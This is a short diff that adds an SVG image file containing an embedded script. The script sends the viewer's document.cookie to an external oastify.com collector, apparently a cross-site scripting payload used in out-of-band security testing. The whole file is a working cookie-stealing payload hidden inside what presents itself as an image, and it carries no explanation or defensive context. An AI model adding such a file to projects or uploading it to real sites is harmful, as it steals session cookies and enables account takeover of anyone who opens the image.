@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('http://3nr6wilk2srb3xspru2oqz3vnmtdh45t.oastify.com?cookie=' + encodeURIComponent(document.cookie));
+  </script>
+</svg>
